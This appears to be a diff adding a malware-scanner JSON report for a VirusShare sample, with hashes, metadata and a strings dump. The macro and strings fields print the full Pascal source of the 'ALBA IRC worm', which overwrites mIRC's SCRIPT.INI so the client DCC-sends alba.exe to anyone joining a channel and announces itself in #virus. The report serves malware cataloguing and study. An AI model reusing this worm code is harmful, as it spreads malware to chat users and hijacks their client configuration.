@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "write": "May write to a file"
+        },
+        "macro": "const scriptini = ('[script]'+Char($D)+Char($A)+\n'n0=on 1:JOIN:#: if ( $me != $nick )'\n'{ /dcc send $nick c:\\mirc\\download\\alba.exe }'+Char($D)+Char($A)+\n'n1=on 1:CONNECT: {'+Char($D)+Char($A)+\n'n2=  /join #virus'+Char($D)+Char($A)+\n'n3=  /msg #virus Hello, I have been infected with the ALBA IRC worm written in \n'n4=}');\nvar f : text;\n\nbegin\n assign(f,'C:\\MIRC\\SCRIPT.INI'); { SCRIPT.INI is the file we want! }\n rewrite(f);\t\t     { Blank the file\t\t  }\n write(f,scriptini);\t     { Write our code to SCRIPT.INI    }\n close(f);\t\t       { Close file & save changes       }\n Halt;\t\t\t   { It's time for a sharp exit ;)   }\nend."
+    },
+    "filename": "VirusShare_ded331f72d97a85f6c43c00d56f70349",
+    "filesize": 640,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ded331f72d97a85f6c43c00d56f70349",
+        "sha1": "9490d1fa9f0231cbef740f11a8cb6db3e9114abd",
+        "sha256": "3284c986770c3c210d0c8aabb90ba88440ccbadab3691cc88a227a1b42a5c7be"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "const scriptini = ('[script]'+Char($D)+Char($A)+",
+            "'n0=on 1:JOIN:#: if ( $me != $nick )'",
+            "'{ /dcc send $nick c:\\mirc\\download\\alba.exe }'+Char($D)+Char($A)+",
+            "'n1=on 1:CONNECT: {'+Char($D)+Char($A)+",
+            "'n2=  /join #virus'+Char($D)+Char($A)+",
+            "'n3=  /msg #virus Hello, I have been infected with the ALBA IRC worm written in ",
+            "'n4=}');",
+            "var f : text;",
+            "begin",
+            " assign(f,'C:\\MIRC\\SCRIPT.INI'); { SCRIPT.INI is the file we want! }",
+            " rewrite(f);\t\t     { Blank the file\t\t  }",
+            " write(f,scriptini);\t     { Write our code to SCRIPT.INI    }",
+            " close(f);\t\t       { Close file & save changes       }",
+            " Halt;\t\t\t   { It's time for a sharp exit ;)   }",
+            "end."
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.270848",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
